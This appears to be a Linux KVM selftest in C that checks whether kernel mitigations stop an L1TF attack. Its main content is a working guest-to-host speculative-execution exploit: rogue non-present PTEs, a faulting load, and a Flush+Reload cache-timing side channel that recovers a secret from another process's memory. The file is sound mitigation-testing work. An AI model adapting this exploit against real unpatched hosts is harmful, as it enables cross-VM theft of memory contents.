// SPDX-License-Identifier: GPL-2.0-only
/* l1tf_test.c: Test if a virtual machine can exploit L1TF.
 * Test that our mitigations break a basic L1TF exploit. The test succeeds if
 * the exfiltrated data doesn't match a fixed secret. The test fails if at least
 * two (2) secret bytes are correctly determined using the L1TF exploit.
 *
 * The test spawns a child process on a non-sibling logical core (attacker and
 * victim co-location is out of scope for ASI V0).
 * For convenience, the test does the following:
 * 1. The test knows the physical address of the child secret.
 * The child secret is located in GFP_USER memory (in scope for ASI V0).
 * 2. The test uses a kernel module that on the hypercall
 * path loads an arbitrary physical address through physmap. This increases
 * the chances that the secret is present in L1D when the attacker VM triggers
 * the fault.
 * 3. The test sets the rogue PTE before VM execution.
 * 4. Finally, the test reads the child secret encoded in the cache via a shared
 * memory region mapped in the virtual machine and in the vmm.
 *
 * The virtual machine exection does trigger the hypercall path that loads the
 * secret in L1D, followed by the execution of the fault instruction that
 * speculatively loads the secret from L1D as a result of L1TF.
 * To assert that it leaked the correct secret, the virtual machine encodes the
 * secret bytes in the cache and transmits them to the vmm process.
 *
 * Note. In a real attack, the full exploit executes inside the virtual
 * machine. This test verifies that the L1TF root cause (the CPU can
 * fetch from L1D using guest-controlled physical addresses) is mitigated, thus
 * the other attack phases can be simplified.
 */

#include "test_util.h"
#include "kvm_util.h"
#include "processor.h"
#include <sched.h>
#include <complex.h>
#include <linux/limits.h>
#include <math.h>
#include <signal.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <err.h>
#include <sys/mman.h>
#include <sys/user.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/sysinfo.h>

struct kvm_regs regs_init;

#define BYTE_MASK ((1UL << 8) - 1)
#define xstr(s) str(s)
#define str(s) #s

#define KVM_HC_GTESTS_KVM_L1TF_TEST 0x42

__aligned(PAGE_SIZE) void guest_code(void)
{
	asm volatile(
		/*
		 * See gtests/kvm/l1tf_test_kmod.c for the hypercall
		 * implementation.
		 * The hypercall loads the secret in L1D, which is a
		 * requirement for exploiting L1TF. If the secret is not in L1
		 * by the time the fault executes, the exploit fails.
		 * This method is not guaranteed to work (e.g. high cache
		 * activity could evict the secret in the meantine) but has
		 * high success rate.
		 * rax = KVM_HC_GTESTS_KVM_L1TF_TEST, rbx = pfn, rcx = offset, rdx = loop
		 */
		"vmcall\n\t"
		/* Bring the probe page translation in the TLB */
		"add %%r8, %%rdi\n\t"
		/*
		 * clflush side effect: It requires the physical address for
		 * cache actions, so the translation is cached in the TLB in
		 * case of TLB miss.
		 */
		"clflush (%%rdi)\n\t"
		"xor %%rdi, %%rdi\n\t"
		"mov %%r9, %%rdx\n\t"
		/* Make sure the above instructions are retired.*/
		"mfence\n\t"
		/*
		 * Speculation window optimization: The faulting instruction
		 * and the cache encoding instructions are on the same cache
		 * line.
		 */
		".align 0x40\n\t"
		"movb (%%rdx), %%sil\n\t" /* faulting instruction */
#ifdef DEBUG
	// Uncomment one of the lines below for negative testing
	// "lfence\n\t" // barrier
	// "movq $0xff, %%rsi\n\t" // secret overwrite
#endif
		/*
		 * The instructions after the fault only execute speculatively.
		 * Architecturally, the faulting instruction causes an
		 * exception. The execution is then resumed at guest_pf_handler.
		 */
		"shl $9, %%rsi\n\t"
		"add %%r8, %%rsi\n\t"
		/*
		 * Access probe page + sil x offset (PROBE_ARRAY_ENTRY_SIZE).
		 * The cached address depends on the secret value in sil. The
		 * value is then read by timing accesses of the probe area.
		 */
		"movq (%%rsi), %%rdx\n\t"
		/* Done. Speculation can stop now. */
		"lfence\n\t"
		/* unreachable */
		"int $0x3\n\t" ::
			:);

	/* The rest of the code should be far from the exploit code. */
	asm volatile(".align " xstr(PAGE_SIZE));
}

static void guest_pf_handler(struct ex_regs *regs)
{
	GUEST_DONE();
}

#define SHMEM_REGION_GVA 0xd0000000ULL
#define SHMEM_REGION_GPA 0xd0000000ULL
#define SHMEM_REGION_SLOT 10
#define SHMEM_ADDR (SHMEM_REGION_GPA)
#define SHMEM_VADDR (SHMEM_REGION_GVA)

/*
 * The probe array is a contiguous memory area used to send/recv side channel
 * signal. The signal corresponds to one out of 256 possible byte values
 * (0x00-0xff).
 * The signal is transmitted by loading a single cache line (corresponding to
 * one byte value) in L1D and it is received by timing the access of that cache
 * line.
 * Distance (PROBE_ARRAY_ENTRY_SIZE) is required between the probe entries -
 * cache lines corresponding to each byte value - so that the prefetcher won't
 * affect the signal i.e. loading of adjacent data does not land on a valid
 * probe entry.
 */
#define NBYTE_VALUES (1 << BITS_PER_BYTE)
#define PROBE_ARRAY_SIZE NBYTE_VALUES
#define PROBE_ARRAY_ENTRY_SIZE 512

#define L1_HIT_THRESHOLD_CPU_CYCLES 100
#define ROGUE_PTE_GVA (1UL << 30)

int prep_and_run_vcpu(struct kvm_vm *vm, struct kvm_vcpu *vcpu,
		      uint64_t child_pfn, uint64_t secret_offset,
		      uint64_t probe_array, size_t probe_page_index)
{
	unsigned long duration[PROBE_ARRAY_SIZE];
	volatile uint64_t ptr, d;
	volatile size_t mix_i;
	struct kvm_regs regs;
	int secret = -1;
	struct ucall uc;
	size_t low, high;

	memset((uint8_t *)duration, 0xff, sizeof(duration));

	vcpu_regs_get(vcpu, &regs);
	regs.rflags = regs_init.rflags;
	regs.rip = regs_init.rip;
	regs.rsp = regs_init.rsp;
	/* vmcall args. */
	regs.rax = KVM_HC_GTESTS_KVM_L1TF_TEST;
	regs.rbx = child_pfn << PAGE_SHIFT;
	regs.rcx = secret_offset;
	/* Number of times to execute the secret load in the helper module. */
	regs.rdx = 10000;
	/* Fault speculation args. */
	regs.r8 = SHMEM_REGION_GVA;
	regs.r9 = ROGUE_PTE_GVA | (secret_offset & (PAGE_SIZE - 1));
	/* Probe array page that we flush before faulting. */
	regs.rdi = probe_page_index * PAGE_SIZE;
	vcpu_regs_set(vcpu, &regs);

	/*
	 * Execute Flush+Reload. This is a generic method to architecturally
	 * read data leaked by speculative execution. The code below - Flush,
	 * vcpu_run(), Reload - mush not be reordered or changed i.e. test
	 * related checks must execute after the fact.
	 */

	/* Flush. */
	for (int i = 0; i < PROBE_ARRAY_SIZE; ++i) {
		ptr = probe_array + i * PROBE_ARRAY_ENTRY_SIZE;
		asm volatile("clflush (%%rax);" ::"a"(ptr) : "memory");
	}
	asm volatile("lfence" :::);

	vcpu_run(vcpu);

	/* Reload. */
	for (int i = PROBE_ARRAY_SIZE - 1; i >= 0; --i) {
		/* Shuffle the probe array access to avoid prefetching. */
		mix_i = ((i * 167) + 13) & 255;
		ptr = probe_array + mix_i * PROBE_ARRAY_ENTRY_SIZE;
		asm volatile("lfence; rdtscp\n\t"
			     "shl $32, %%rdx; or %%rdx, %%rax\n\t"
			     "mov %%rax, %%r8\n\t"
			     "mov (%%rdi), %%rdi\n\t"
			     "lfence; rdtscp\n\t"
			     "shl $32, %%rdx; or %%rdx, %%rax\n\t"
			     "sub %%r8, %%rax\n\t"
			     "lfence\n\t"
			     "mov %%rax, %0\n\t"
			     : "=rm"(d)
			     : "D"(ptr)
			     : "rax", "rdx", "rcx", "r8", "memory");
		duration[mix_i] = d;
	}

#ifdef DEBUG
	vcpu_dump(stdout, vcpu, 0);
#endif

	TEST_ASSERT(vcpu->run->exit_reason == KVM_EXIT_IO,
		    "Unexpected exit: %s\n",
		    exit_reason_str(vcpu->run->exit_reason));
	TEST_ASSERT(get_ucall(vcpu, &uc) == UCALL_DONE,
		    "Unhandled ucall: %ld\nexit_reason: %u (%s)", uc.cmd,
		    vcpu->run->exit_reason,
		    exit_reason_str(vcpu->run->exit_reason));
	/*
	 * Method to discard F+R noise produced by TLB misses on the probe
	 * pages.
	 * Samples lower than probe_page_index * PAGE_SIZE are invalid.
	 * Samples higher than probe_page_index * PAGE_SIZE + PAGE_SIZE are
	 * invalid.
	 * Don't break because "0" is often a false positive.
	 */
	low = probe_page_index * PAGE_SIZE / PROBE_ARRAY_ENTRY_SIZE;
	high = low + (PAGE_SIZE / PROBE_ARRAY_ENTRY_SIZE);
	TEST_ASSERT((high - 1) < PROBE_ARRAY_SIZE, "Invalid F+R offset");

	for (size_t i = low; i < high; ++i) {
		if (duration[i] < L1_HIT_THRESHOLD_CPU_CYCLES)
			secret = i;
	}
	return secret;
}

uint8_t get_max(size_t *v, size_t len)
{
	size_t maxv = v[0];
	size_t pos = 0;
	int i;

	for (i = 1; i < len; ++i) {
		if (v[i] > maxv) {
			maxv = v[i];
			pos = i;
		}
	}
	return pos;
}

uint8_t read_byte_vm(struct kvm_vm *vm, struct kvm_vcpu *vcpu,
		     uint64_t child_pfn, uint64_t secret_offset,
		     uint64_t probe_array)
{
	size_t nprobe_pages, secret_samples[NBYTE_VALUES];
	uint64_t nruns = 60;
	int i, j, secret;

	nprobe_pages = PROBE_ARRAY_SIZE * PROBE_ARRAY_ENTRY_SIZE / PAGE_SIZE;
	memset(secret_samples, 0, sizeof(secret_samples));
	for (i = 0; i < nruns; ++i) {
		/*
		 * Need to run the exploit multiple times so that the probe
		 * page that the secret byte lands on has a TLB entry.
		 * The probe array has
		 * PROBE_ARRAY_SIZE x PROBE_ARRAY_ENTRY_SIZE / PAGE_SIZE = 32
		 * pages. The guest code flushes one probe page, which at uarch
		 * level, accesses the page and caches the translation in
		 * the TLB.
		 */
		for (j = 0; j < nprobe_pages; ++j) {
			secret = prep_and_run_vcpu(vm, vcpu, child_pfn,
						   secret_offset, probe_array,
						   j);
			TEST_ASSERT(secret < NBYTE_VALUES,
				    "Invalid secret value: 0x%x", secret);
			if (secret >= 0)
				secret_samples[secret] += 1;
		}
	}

	return get_max(secret_samples, NBYTE_VALUES);
}

void set_pte_l1tf(struct kvm_vm *vm, struct kvm_vcpu *vcpu, uint64_t va,
		  uint64_t pa)
{
	uint64_t *pte = vm_get_page_table_entry(vm, va);
	/*
	 * According to Intel, a fault delivered to a PTE with Present bit = 0
	 * is a terminal fault because the condition causes the address
	 * translation to terminate immediately.
	 * During the terminal fault, the processor _speculatively_ computes an
	 * address based the on the PTE and the address of the fault and uses
	 * this address in the following instructions.
	 */
	*pte = (pa & ~(PAGE_SIZE - 1));
}

void set_pte_bits(struct kvm_vm *vm, struct kvm_vcpu *vcpu, uint64_t vaddr,
		  uint64_t bits)
{
	uint64_t *pte = vm_get_page_table_entry(vm, vaddr);

	bits = bits & (PAGE_SIZE - 1);
	*pte |= bits;
}

#define PAGEMAP_PFN_MASK ((1UL << 55) - 1)
uint64_t pagemap(uint64_t va)
{
	uint64_t pfn, offset;
	char path[] = "/proc/self/pagemap";
	int fd;

	fd = open(path, O_RDONLY);
	TEST_ASSERT(fd > 0, "Failed to open() %s", path);

	va = va >> PAGE_SHIFT;
	offset = va * sizeof(uint64_t);
	TEST_ASSERT(lseek(fd, offset, SEEK_SET) >= 0, "lseek() failed");

	TEST_ASSERT(read(fd, (void *)&pfn, sizeof(uint64_t)) == sizeof(pfn),
		    "read() failed");

	close(fd);

	return (pfn & PAGEMAP_PFN_MASK) << PAGE_SHIFT;
}

#define SECRET_VALUE 0x11223344aabbccddUL

/*
 * The child process owns a secret which the test process aims to read by
 * exploiting L1TF.
 * The words "attacker" and "victim" are avoided on purpose because this test is
 * not an exploit but a program that tests if the host kernel mitigates L1TF.
 */
void child_process(char *path)
{
	int i, fd;
	uint64_t pa;
	uint64_t *secret_page;

	secret_page = (uint64_t *)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
				       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	TEST_ASSERT((void *)secret_page != MAP_FAILED, "mmap() failed");

	for (i = 0; i < PAGE_SIZE / sizeof(*secret_page); ++i)
		secret_page[i] = SECRET_VALUE;

	pa = pagemap((uint64_t)secret_page);

	fd = open(path, O_WRONLY);
	TEST_ASSERT(fd > 0, "Failed to open %s", path);

	TEST_ASSERT(write(fd, &pa, sizeof(pa)) > 0, "write() failed");
	close(fd);

	while (true)
		sleep(1);
}

/*
 * The child process finds the PFN corresponding to the secret page and writes
 * it in a file shared between the test process and child process.
 * In a real scenario, the attacker is unlikely to know the physical address so
 * it scans the entire physical memory for a known sequence located on the same
 * page with the secret. Then it reads all memory from that physical address,
 * including the secret.
 */
uint64_t get_child_secret_pa(char *path)
{
	uint64_t pa;
	int fd;

	fd = open(path, O_RDONLY);
	TEST_ASSERT(fd > 0, "Failed to open %s", path);

	read(fd, &pa, sizeof(pa));
	close(fd);
	return pa;
}

int physical_address_bits(void)
{
	uint32_t eax, ebx, ecx, edx;

	cpuid(0x80000008, &eax, &ebx, &ecx, &edx);
	return eax & BYTE_MASK;
}

#define BUF_SIZE 64
bool l1tf_present(void)
{
	int fd;
	char buf[BUF_SIZE];
	char not_affected[] = "Not affected";
	char path[] = "/sys/devices/system/cpu/vulnerabilities/l1tf";

	fd = open(path, O_RDONLY);
	TEST_ASSERT(fd > 0, "Failed to open() %s", path);
	TEST_ASSERT(read(fd, buf, BUF_SIZE) > 0, "read() failed");
	close(fd);
	return strncmp(buf, not_affected, sizeof(not_affected) - 1) != 0;
}

bool kmod_present(void)
{
	char proc_modules[] = "/proc/modules";
	char kmod_name[] = "l1tf_test_kmod";
	bool kmod_found = false;
	char line[PATH_MAX];
	FILE *f = NULL;

	f = fopen(proc_modules, "r");
	TEST_ASSERT(f != NULL, "Failed to fopen() %s", proc_modules);

	while (fgets(line, sizeof(line), f) > 0) {
		if (strncmp(line, kmod_name, sizeof(kmod_name) - 1) == 0) {
			kmod_found = true;
			break;
		}
	}

	fclose(f);
	return kmod_found;
}

int thread_sibling_id(int core)
{
	char buf[PATH_MAX];
	int fd, sibling_id, id;

	sprintf(buf,
		"/sys/devices/system/cpu/cpu%d/topology/thread_siblings_list",
		core);

	TEST_ASSERT((fd = open(buf, O_RDONLY)) > 0, "Failed to open() %s", buf);
	memset(buf, 0, PATH_MAX);
	TEST_ASSERT(read(fd, buf, PATH_MAX) > 0, "read() failed");
	close(fd);
	TEST_ASSERT(sscanf(buf, "%d,%d", &id, &sibling_id) == 2,
		    "sscanf() failed");
	return sibling_id;
}

void cleanup(int child_pid, struct kvm_vm *vm)
{
	kill(child_pid, SIGKILL);
	kvm_vm_free(vm);
}

#define PCPU_ID 2
int main(int argc, char *argv[], char *envp[])
{
	uint64_t probe_array, secret_pa, physical_address_mask, leaked_value;
	size_t secret_size = 8, nprobe_pages, match = 0, mask;
	char tmp_path[] = "/tmp/tmp.L1TF.test";
	struct kvm_vcpu *vcpu;
	long secret_pa_offset;
	int pid, i, nbits_pa;
	struct kvm_vm *vm;
	uint8_t *secret;

	if (argc == 2 && !strncmp(argv[1], tmp_path, sizeof(tmp_path))) {
		/*
		 * The test (main process) spawned a child process to execute
		 * on the hyperthread. The child runs an infinite loop.
		 */
		child_process(argv[1]);
		TEST_ASSERT(false, "Unreachable");
	}

	TEST_REQUIRE(l1tf_present());
	TEST_REQUIRE(kmod_present());
	TEST_REQUIRE(kvm_cpu_has(X86_FEATURE_CLFLUSH));
	TEST_REQUIRE(get_nprocs() > PCPU_ID);

	kvm_pin_this_task_to_pcpu(PCPU_ID);

	mkfifo(tmp_path, 0666);

	pid = fork();
	TEST_ASSERT(pid >= 0, "fork() failed");
	if (pid == 0) {
		char *child_argv[] = { NULL, NULL, NULL };
		int child_cpu;
		/*
		 * The child process needs to run on a separate physical core.
		 * ASI V1 does not disable smt nor it suspends the sibling
		 * hyperthread.
		 * ASI V1 flushes L1D at vmentry so it should break this test
		 * when the test and the child are _not_ co-located.
		 */
		child_cpu = thread_sibling_id(PCPU_ID) + 1;
		TEST_ASSERT(child_cpu != PCPU_ID && child_cpu < get_nprocs(),
			    "Invalid child cpu %d", child_cpu);

		kvm_pin_this_task_to_pcpu(child_cpu);
		pr_info("[%d] Child running on core (%d).\n", getpid(),
			child_cpu);

		child_argv[0] = argv[0];
		child_argv[1] = tmp_path;
		TEST_ASSERT(execve(child_argv[0], child_argv, envp) != -1,
			    "execve() failed");
	} else if (pid > 0) {
		/* Parent. */
		pr_info("[%d] Forked child process (%d). Parent running on core (%d).\n",
			getpid(), pid, PCPU_ID);
	}

	secret_pa = get_child_secret_pa(tmp_path);
	unlink(tmp_path);

	nbits_pa = physical_address_bits();
	physical_address_mask = (1UL << nbits_pa) - 1;
	physical_address_mask &= PAGE_MASK;

	TEST_ASSERT(
		(secret_pa & ~physical_address_mask) == 0,
		"Physical address check failure: 0x%lx (not aligned or sets bits higher than %d).",
		secret_pa, nbits_pa);

	vm = vm_create_with_one_vcpu(&vcpu, guest_code);

	/*
	 * Map the rogue PTE.
	 * The guest access of ROGUE_PTE_GVA triggers a fault because the
	 * present bit is not set. As a result, a CPU vulnerable to L1TF uses
	 * the guest-controlled physical address (secret_pa) to fetch data from
	 * L1D. The speculation window following the fault is large enough to
	 * encode the data into a side-channel.
	 */
	virt_map(vm, ROGUE_PTE_GVA, secret_pa, 1);
	set_pte_l1tf(vm, vcpu, ROGUE_PTE_GVA, secret_pa);

	/*
	 * Flush+Reload (F+R) probe.
	 * This allocates the required memory area for F+R (prep_and_run_vcpu).
	 */
	nprobe_pages = PROBE_ARRAY_SIZE * PROBE_ARRAY_ENTRY_SIZE / PAGE_SIZE;

	vm_userspace_mem_region_add(vm, VM_MEM_SRC_ANONYMOUS, SHMEM_REGION_GPA,
				    SHMEM_REGION_SLOT, nprobe_pages, 0);

	probe_array = (uint64_t)addr_gpa2hva(vm, SHMEM_REGION_GPA);
	/* Ensure that pages are present (resident in memory) on the host. */
	for (i = 0; i < nprobe_pages; ++i)
		WRITE_ONCE(*(uint64_t *)(probe_array + i * PAGE_SIZE), 0x42);

	virt_map(vm, SHMEM_REGION_GVA, SHMEM_REGION_GPA, nprobe_pages);

	for (i = 0; i < nprobe_pages; ++i) {
		/* The probe pages need to be present. */
		set_pte_bits(vm, vcpu, SHMEM_REGION_GVA + i * PAGE_SIZE,
			     PTE_PRESENT_MASK);
	}

	/* The rogue PTE triggers a fault, so we exit gracefully. */
	vm_install_exception_handler(vm, PF_VECTOR, guest_pf_handler);

	/*
	 * Save the initial register state so that RSP can be reinitialized at
	 * every vcpu execution. Otherwise we run out of stack.
	 */
	vcpu_regs_get(vcpu, &regs_init);

	secret = (uint8_t *)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
				 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	TEST_ASSERT((void *)secret != MAP_FAILED, "Failed to allocate memory");

	/*
	 * Read from the second L1 cache set since the first might have more
	 * activity. This makes the test more stable.
	 */
	secret_pa_offset = sysconf(_SC_LEVEL1_DCACHE_LINESIZE);
	TEST_ASSERT(secret_pa_offset != -1,
		    "sysconf(_SC_LEVEL1_DCACHE_LINESIZE) failed");

	for (i = 0; i < secret_size; ++i) {
		secret[i] = read_byte_vm(vm, vcpu, secret_pa >> PAGE_SHIFT,
					 secret_pa_offset + i,
					 (uint64_t)probe_array);
	}

	/*
	 * Count the number of matching bytes. The test can be noisy therefore
	 * some byte values might be wrong.
	 */
	leaked_value = *(uint64_t *)secret;
	for (i = 0; i < secret_size; ++i) {
		mask = 0xFFUL << (8 * i);
		if ((leaked_value & mask) == (SECRET_VALUE & mask))
			match++;
	}

	if (match > 1) {
		cleanup(pid, vm);
		TEST_FAIL(
			"The leaked secret (0x%lx) (partially) matches expected secret (0x%lx)",
			leaked_value, SECRET_VALUE);
	}
	pr_info("[PASS] The rogue guest cannot exploit L1TF against the host kernel to leak user memory. The leaked secret (0x%lx) doesn't match the child secret (0x%lx).\n",
		leaked_value, SECRET_VALUE);

	cleanup(pid, vm);

	return 0;
}
